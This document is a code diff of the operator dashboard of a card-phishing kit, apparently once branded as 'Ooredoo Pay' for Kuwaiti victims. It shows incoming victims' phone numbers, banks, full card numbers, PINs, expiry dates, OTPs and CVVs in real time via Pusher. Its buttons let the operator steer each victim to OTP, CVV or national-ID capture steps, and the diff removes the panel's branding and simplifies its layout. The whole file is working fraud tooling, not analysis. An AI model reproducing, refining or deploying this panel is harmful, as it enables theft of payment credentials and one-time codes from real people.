@@ -3,74 +3,65 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لوحة التحكم - Admin Panel</title>
+    <title>لوحة التحكم</title>
     <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f5f5f5; color: #333; min-height: 100vh; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #ffffff; color: #333; min-height: 100vh; padding: 15px; }
         
-        .header { background: #ffffff; padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #e94560; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
-        .header h1 { color: #e94560; font-size: 22px; }
-        .header .status { display: flex; align-items: center; gap: 8px; }
-        .header .status .dot { width: 10px; height: 10px; border-radius: 50%; background: #28a745; animation: pulse 2s infinite; }
+        .header { background: #fff; padding: 10px 15px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #e94560; margin-bottom: 15px; }
+        .header h1 { color: #e94560; font-size: 18px; }
+        .header .status { display: flex; align-items: center; gap: 6px; font-size: 13px; }
+        .header .status .dot { width: 8px; height: 8px; border-radius: 50%; background: #28a745; animation: pulse 2s infinite; }
         @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
         
-        .container { max-width: 1200px; margin: 20px auto; padding: 0 20px; }
+        .entries-list { display: flex; flex-direction: column; gap: 10px; }
         
-        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 25px; }
-        .stat-card { background: #ffffff; border-radius: 10px; padding: 20px; text-align: center; border: 1px solid #e0e0e0; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
-        .stat-card .number { font-size: 36px; font-weight: bold; color: #e94560; }
-        .stat-card .label { color: #777; margin-top: 5px; }
+        .entry-row { background: #fff; border: 1px solid #e0e0e0; border-radius: 8px; padding: 12px 15px; display: flex; align-items: center; gap: 15px; }
+        .entry-row .phone { font-weight: bold; font-size: 15px; color: #333; min-width: 110px; }
+        .entry-row .amount { font-size: 14px; color: #e94560; font-weight: bold; min-width: 70px; }
+        .entry-row .card-btn { background: #28a745; color: #fff; border: none; padding: 8px 16px; border-radius: 5px; cursor: pointer; font-size: 13px; font-weight: bold; }
+        .entry-row .card-btn:hover { background: #218838; }
+        .entry-row .time { font-size: 11px; color: #999; margin-right: auto; }
         
-        .section { background: #ffffff; border-radius: 10px; padding: 20px; margin-bottom: 20px; border: 1px solid #e0e0e0; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
-        .section h2 { color: #e94560; margin-bottom: 15px; font-size: 18px; border-bottom: 1px solid #eee; padding-bottom: 10px; }
+        /* Modal / Detail Panel */
+        .modal-overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.5); z-index: 1000; justify-content: center; align-items: center; }
+        .modal-overlay.active { display: flex; }
         
-        .submission-card { background: #fafafa; border-radius: 8px; padding: 15px; margin-bottom: 15px; border-left: 4px solid #e94560; border: 1px solid #e0e0e0; }
-        .submission-card.active { border-left-color: #28a745; background: #fff; }
-        .submission-card .info-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 10px; margin-bottom: 15px; }
-        .submission-card .info-item .label { color: #999; font-size: 12px; }
-        .submission-card .info-item .value { color: #333; font-size: 14px; font-weight: bold; margin-top: 3px; }
+        .modal { background: #fff; border-radius: 12px; padding: 25px; width: 90%; max-width: 450px; position: relative; }
+        .modal .close-btn { position: absolute; top: 10px; left: 10px; background: none; border: none; font-size: 22px; cursor: pointer; color: #999; }
+        .modal .close-btn:hover { color: #333; }
         
-        .actions { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 10px; }
-        .btn { padding: 8px 16px; border: none; border-radius: 5px; cursor: pointer; font-size: 13px; font-weight: bold; transition: all 0.3s; }
-        .btn:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(0,0,0,0.15); }
-        .btn-accept { background: #28a745; color: #fff; }
-        .btn-otp { background: #ffa500; color: #fff; }
-        .btn-cvv { background: #17a2b8; color: #fff; }
-        .btn-hawety { background: #e83e8c; color: #fff; }
-        .btn-reject { background: #dc3545; color: #fff; }
-        .btn-error { background: #6c757d; color: #fff; }
-        .btn-idpedol { background: #6f42c1; color: #fff; }
-        .btn-clear { background: #e94560; color: #fff; padding: 10px 20px; }
+        .modal h2 { color: #333; font-size: 16px; margin-bottom: 15px; border-bottom: 1px solid #eee; padding-bottom: 10px; }
         
-        .status-badge { display: inline-block; padding: 3px 10px; border-radius: 12px; font-size: 11px; font-weight: bold; }
-        .status-pending { background: #fff3cd; color: #856404; }
-        .status-Accept { background: #d4edda; color: #155724; }
-        .status-Reject { background: #f8d7da; color: #721c24; }
-        .status-cvv { background: #d1ecf1; color: #0c5460; }
-        .status-otp { background: #fff3cd; color: #856404; }
-        .status-hawety { background: #f8d7da; color: #721c24; }
-        .status-error { background: #e2e3e5; color: #383d41; }
-        .status-idpedol { background: #e8daef; color: #4a235a; }
+        .detail-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 20px; }
+        .detail-item { }
+        .detail-item .label { font-size: 11px; color: #999; margin-bottom: 3px; }
+        .detail-item .value { font-size: 14px; font-weight: bold; color: #333; }
+        .detail-item.full { grid-column: 1 / -1; }
+        .detail-item .value.card-number { font-size: 16px; letter-spacing: 1px; color: #000; direction: ltr; text-align: right; }
         
-        .empty-state { text-align: center; padding: 40px; color: #999; }
-        .empty-state .icon { font-size: 48px; margin-bottom: 10px; }
+        .control-buttons { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 15px; padding-top: 15px; border-top: 1px solid #eee; }
+        .ctrl-btn { padding: 10px 18px; border: none; border-radius: 6px; cursor: pointer; font-size: 13px; font-weight: bold; flex: 1; min-width: 100px; text-align: center; }
+        .ctrl-btn:hover { opacity: 0.85; transform: translateY(-1px); }
+        .ctrl-btn.otp { background: #ffa500; color: #fff; }
+        .ctrl-btn.cvv { background: #17a2b8; color: #fff; }
+        .ctrl-btn.hawety { background: #6f42c1; color: #fff; }
+        .ctrl-btn.reject { background: #dc3545; color: #fff; }
+        .ctrl-btn.accept { background: #28a745; color: #fff; }
         
-        .log-entry { padding: 8px 12px; border-bottom: 1px solid #eee; font-size: 13px; display: flex; justify-content: space-between; }
-        .log-entry .time { color: #999; font-size: 11px; }
+        .empty-state { text-align: center; padding: 60px 20px; color: #ccc; font-size: 16px; }
         
-        .notification { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: #28a745; color: #fff; padding: 12px 24px; border-radius: 8px; font-weight: bold; z-index: 1000; display: none; animation: slideDown 0.3s; }
-        @keyframes slideDown { from { top: -50px; opacity: 0; } to { top: 20px; opacity: 1; } }
+        .notification { position: fixed; top: 15px; left: 50%; transform: translateX(-50%); background: #28a745; color: #fff; padding: 10px 20px; border-radius: 6px; font-weight: bold; font-size: 13px; z-index: 2000; display: none; }
         
-        .sound-btn { background: none; border: 1px solid #999; color: #666; padding: 5px 10px; border-radius: 5px; cursor: pointer; font-size: 12px; }
-        .sound-btn.active { border-color: #28a745; color: #28a745; }
+        .clear-btn { background: #dc3545; color: #fff; border: none; padding: 6px 12px; border-radius: 4px; cursor: pointer; font-size: 12px; }
     </style>
 </head>
 <body>
     <div class="header">
-        <h1>لوحة التحكم - Ooredoo Pay</h1>
+        <h1>لوحة التحكم</h1>
         <div class="status">
-            <button class="sound-btn active" id="soundBtn" onclick="toggleSound()">الصوت: مفعل</button>
+            <button class="clear-btn" onclick="clearAll()">مسح الكل</button>
             <div class="dot"></div>
             <span>متصل</span>
         </div>
@@ -78,237 +69,175 @@
 
     <div class="notification" id="notification"></div>
 
-    <div class="container">
-        <div class="stats">
-            <div class="stat-card">
-                <div class="number" id="totalCount">0</div>
-                <div class="label">إجمالي الطلبات</div>
-            </div>
-            <div class="stat-card">
-                <div class="number" id="pendingCount">0</div>
-                <div class="label">في الانتظار</div>
-            </div>
-            <div class="stat-card">
-                <div class="number" id="acceptedCount">0</div>
-                <div class="label">مقبولة</div>
-            </div>
-            <div class="stat-card">
-                <div class="number" id="rejectedCount">0</div>
-                <div class="label">مرفوضة</div>
-            </div>
-        </div>
+    <div class="entries-list" id="entriesList">
+        <div class="empty-state">في انتظار بيانات جديدة...</div>
+    </div>
 
-        <div class="section">
-            <h2>الطلبات الواردة <button class="btn btn-clear" onclick="clearAll()" style="float:left; font-size:12px; padding:5px 12px;">مسح الكل</button></h2>
-            <div id="submissionsList">
-                <div class="empty-state">
-                    <div class="icon">&#128203;</div>
-                    <p>لا توجد طلبات حالياً... في انتظار بيانات جديدة</p>
+    <!-- Modal for card details -->
+    <div class="modal-overlay" id="modalOverlay">
+        <div class="modal">
+            <button class="close-btn" onclick="closeModal()">&times;</button>
+            <h2>تفاصيل البطاقة</h2>
+            <div class="detail-grid">
+                <div class="detail-item full">
+                    <div class="label">رقم البطاقة</div>
+                    <div class="value card-number" id="modalCardNumber">-</div>
+                </div>
+                <div class="detail-item">
+                    <div class="label">البنك</div>
+                    <div class="value" id="modalBank">-</div>
+                </div>
+                <div class="detail-item">
+                    <div class="label">PIN</div>
+                    <div class="value" id="modalPin">-</div>
+                </div>
+                <div class="detail-item">
+                    <div class="label">تاريخ الانتهاء</div>
+                    <div class="value" id="modalExpiry">-</div>
+                </div>
+                <div class="detail-item">
+                    <div class="label">OTP</div>
+                    <div class="value" id="modalOtp" style="color:#ffa500;">-</div>
                 </div>
             </div>
-        </div>
-
-        <div class="section">
-            <h2>سجل الأحداث</h2>
-            <div id="logsList"></div>
+            <div class="control-buttons">
+                <button class="ctrl-btn otp" id="btnOtp" onclick="sendCmd('otp')">نقل لـ OTP</button>
+                <button class="ctrl-btn cvv" id="btnCvv" onclick="sendCmd('cvv')">نقل لـ CVV</button>
+                <button class="ctrl-btn hawety" id="btnHawety" onclick="sendCmd('hawety')">نقل لهويتي</button>
+                <button class="ctrl-btn accept" id="btnAccept" onclick="sendCmd('Accept')">قبول</button>
+                <button class="ctrl-btn reject" id="btnReject" onclick="sendCmd('Reject')">رفض</button>
+            </div>
         </div>
     </div>
 
     <script>
-        let soundEnabled = true;
         let submissions = [];
+        let currentPid = null;
 
         // Initialize Pusher
         Pusher.logToConsole = false;
-        const pusher = new Pusher('d1868eff0961af03482e', {
-            cluster: 'ap2'
-        });
-
-        // Subscribe to admin channel
+        const pusher = new Pusher('d1868eff0961af03482e', { cluster: 'ap2' });
         const adminChannel = pusher.subscribe('admin-channel');
         
         adminChannel.bind('new-submission', function(data) {
-            addSubmission(data);
-            showNotification('طلب جديد وارد!');
+            submissions.push(data);
+            renderEntries();
+            showNotification('طلب جديد!');
             playSound();
         });
 
         adminChannel.bind('update-submission', function(data) {
-            updateSubmission(data);
-            showNotification('تم تحديث بيانات الطلب');
-            playSound();
+            const idx = submissions.findIndex(s => s.id == data.id);
+            if (idx >= 0) {
+                submissions[idx] = data;
+                renderEntries();
+                // Update modal if open
+                if (currentPid == data.pid) {
+                    openModal(data.pid);
+                }
+                showNotification('تم تحديث البيانات');
+                playSound();
+            }
         });
 
-        // Load existing submissions
+        // Load existing
         fetch('/api/submissions')
             .then(r => r.json())
-            .then(data => {
-                submissions = data;
-                renderSubmissions();
-            });
+            .then(data => { submissions = data; renderEntries(); });
 
-        function addSubmission(sub) {
-            submissions.push(sub);
-            renderSubmissions();
-            addLog('طلب جديد من: ' + (sub.phone || 'غير محدد') + ' - البنك: ' + (sub.bank || 'غير محدد'));
-        }
-
-        function updateSubmission(sub) {
-            const idx = submissions.findIndex(s => s.id == sub.id);
-            if (idx >= 0) {
-                submissions[idx] = sub;
-                renderSubmissions();
-                if (sub.otp) addLog('تم استلام OTP: ' + sub.otp + ' من الطلب #' + sub.id);
-                if (sub.cvv) addLog('تم استلام CVV: ' + sub.cvv + ' من الطلب #' + sub.id);
-            }
-        }
-
-        function renderSubmissions() {
-            const list = document.getElementById('submissionsList');
-            
+        function renderEntries() {
+            const list = document.getElementById('entriesList');
             if (submissions.length === 0) {
-                list.innerHTML = '<div class="empty-state"><div class="icon">&#128203;</div><p>لا توجد طلبات حالياً... في انتظار بيانات جديدة</p></div>';
-                updateStats();
+                list.innerHTML = '<div class="empty-state">في انتظار بيانات جديدة...</div>';
                 return;
             }
-
             list.innerHTML = submissions.slice().reverse().map(sub => `
-                <div class="submission-card ${sub.status === 'pending' ? 'active' : ''}">
-                    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
-                        <span style="color:#999; font-size:12px;">#${sub.id} - ${new Date(sub.timestamp).toLocaleString('ar-EG')}</span>
-                        <span class="status-badge status-${sub.status}">${getStatusLabel(sub.status)}</span>
-                    </div>
-                    <div class="info-grid">
-                        <div class="info-item"><div class="label">رقم الهاتف</div><div class="value">${sub.phone || '-'}</div></div>
-                        <div class="info-item"><div class="label">البنك</div><div class="value">${sub.bank || '-'}</div></div>
-                        <div class="info-item"><div class="label">رقم البطاقة</div><div class="value">${sub.cardPrefix || ''}${sub.cardNumber || '-'}</div></div>
-                        <div class="info-item"><div class="label">تاريخ الانتهاء</div><div class="value">${sub.expMonth || '--'}/${sub.expYear || '--'}</div></div>
-                        <div class="info-item"><div class="label">PIN</div><div class="value">${sub.pin || '-'}</div></div>
-                        <div class="info-item"><div class="label">المبلغ</div><div class="value">${sub.amount || '-'} KD</div></div>
-                        ${sub.otp ? `<div class="info-item"><div class="label">OTP</div><div class="value" style="color:#e67e22;">${sub.otp}</div></div>` : ''}
-                        ${sub.cvv ? `<div class="info-item"><div class="label">CVV</div><div class="value" style="color:#17a2b8;">${sub.cvv}</div></div>` : ''}
-                    </div>
-                    ${sub.status === 'pending' ? `
-                    <div class="actions">
-                        <button class="btn btn-accept" onclick="sendCommand('Accept', '${sub.pid}')">قبول (Accept)</button>
-                        <button class="btn btn-otp" onclick="sendCommand('otp', '${sub.pid}')">طلب OTP</button>
-                        <button class="btn btn-cvv" onclick="sendCommand('cvv', '${sub.pid}')">طلب CVV</button>
-                        <button class="btn btn-hawety" onclick="sendCommand('hawety', '${sub.pid}')">هويتي</button>
-                        <button class="btn btn-idpedol" onclick="sendCommand('idpedol', '${sub.pid}')">معلق</button>
-                        <button class="btn btn-reject" onclick="sendCommand('Reject', '${sub.pid}')">رفض (Reject)</button>
-                        <button class="btn btn-error" onclick="sendCommand('error', '${sub.pid}')">خطأ (Error)</button>
-                    </div>
-                    ` : ''}
+                <div class="entry-row">
+                    <div class="phone">${sub.phone || '-'}</div>
+                    <div class="amount">${sub.amount || '-'} KD</div>
+                    <button class="card-btn" onclick="openModal('${sub.pid}')">البطاقة</button>
+                    <div class="time">${new Date(sub.timestamp).toLocaleTimeString('ar-EG')}</div>
                 </div>
             `).join('');
-
-            updateStats();
         }
 
-        function getStatusLabel(status) {
-            const labels = {
-                'pending': 'في الانتظار',
-                'Accept': 'مقبول',
-                'Reject': 'مرفوض',
-                'cvv': 'طلب CVV',
-                'otp': 'طلب OTP',
-                'hawety': 'هويتي',
-                'error': 'خطأ',
-                'idpedol': 'معلق'
-            };
-            return labels[status] || status;
+        function openModal(pid) {
+            currentPid = pid;
+            const sub = submissions.find(s => s.pid == pid);
+            if (!sub) return;
+            
+            document.getElementById('modalCardNumber').textContent = (sub.cardPrefix || '') + (sub.cardNumber || '-');
+            document.getElementById('modalBank').textContent = sub.bank || '-';
+            document.getElementById('modalPin').textContent = sub.pin || '-';
+            document.getElementById('modalExpiry').textContent = (sub.expMonth || '--') + '/' + (sub.expYear || '--');
+            document.getElementById('modalOtp').textContent = sub.otp || '-';
+            
+            document.getElementById('modalOverlay').classList.add('active');
         }
 
-        function updateStats() {
-            document.getElementById('totalCount').textContent = submissions.length;
-            document.getElementById('pendingCount').textContent = submissions.filter(s => s.status === 'pending').length;
-            document.getElementById('acceptedCount').textContent = submissions.filter(s => s.status === 'Accept').length;
-            document.getElementById('rejectedCount').textContent = submissions.filter(s => s.status === 'Reject').length;
+        function closeModal() {
+            document.getElementById('modalOverlay').classList.remove('active');
+            currentPid = null;
         }
 
-        function sendCommand(command, pid) {
+        function sendCmd(command) {
+            if (!currentPid) return;
             fetch('/api/command', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ command: command, pid: pid })
+                body: JSON.stringify({ command: command, pid: currentPid })
             })
             .then(r => r.json())
             .then(data => {
                 if (data.success) {
-                    addLog('تم إرسال أمر: ' + getStatusLabel(command) + ' للمستخدم');
-                    const sub = submissions.find(s => s.pid == pid && s.status === 'pending');
-                    if (sub) {
-                        sub.status = command;
-                        renderSubmissions();
-                    }
+                    showNotification('تم إرسال: ' + command);
                 }
             });
         }
 
         function clearAll() {
-            if (confirm('هل أنت متأكد من مسح جميع الطلبات؟')) {
+            if (confirm('مسح جميع الطلبات؟')) {
                 fetch('/api/clear', { method: 'POST' })
                     .then(r => r.json())
-                    .then(() => {
-                        submissions = [];
-                        renderSubmissions();
-                        addLog('تم مسح جميع الطلبات');
-                    });
-            }
-        }
-
-        function addLog(message) {
-            const logsList = document.getElementById('logsList');
-            const time = new Date().toLocaleTimeString('ar-EG');
-            const entry = document.createElement('div');
-            entry.className = 'log-entry';
-            entry.innerHTML = `<span>${message}</span><span class="time">${time}</span>`;
-            logsList.insertBefore(entry, logsList.firstChild);
-            while (logsList.children.length > 50) {
-                logsList.removeChild(logsList.lastChild);
+                    .then(() => { submissions = []; renderEntries(); closeModal(); });
             }
         }
 
         function showNotification(msg) {
-            const notif = document.getElementById('notification');
-            notif.textContent = msg;
-            notif.style.display = 'block';
-            setTimeout(() => { notif.style.display = 'none'; }, 3000);
+            const n = document.getElementById('notification');
+            n.textContent = msg;
+            n.style.display = 'block';
+            setTimeout(() => { n.style.display = 'none'; }, 2500);
         }
 
         function playSound() {
-            if (!soundEnabled) return;
             try {
                 const ctx = new (window.AudioContext || window.webkitAudioContext)();
                 const osc = ctx.createOscillator();
                 const gain = ctx.createGain();
-                osc.connect(gain);
-                gain.connect(ctx.destination);
-                osc.frequency.value = 800;
-                gain.gain.value = 0.3;
+                osc.connect(gain); gain.connect(ctx.destination);
+                osc.frequency.value = 800; gain.gain.value = 0.3;
                 osc.start();
                 setTimeout(() => { osc.stop(); ctx.close(); }, 200);
             } catch(e) {}
         }
 
-        function toggleSound() {
-            soundEnabled = !soundEnabled;
-            const btn = document.getElementById('soundBtn');
-            btn.textContent = 'الصوت: ' + (soundEnabled ? 'مفعل' : 'معطل');
-            btn.className = 'sound-btn' + (soundEnabled ? ' active' : '');
-        }
+        // Click outside modal to close
+        document.getElementById('modalOverlay').addEventListener('click', function(e) {
+            if (e.target === this) closeModal();
+        });
 
-        // Auto-refresh every 10 seconds
+        // Auto-refresh
         setInterval(() => {
             fetch('/api/submissions')
                 .then(r => r.json())
                 .then(data => {
-                    if (data.length !== submissions.length) {
+                    if (JSON.stringify(data) !== JSON.stringify(submissions)) {
                         submissions = data;
-                        renderSubmissions();
+                        renderEntries();
                     }
                 });
-        }, 10000);
+        }, 5000);
     </script>
 </body>
 </html>
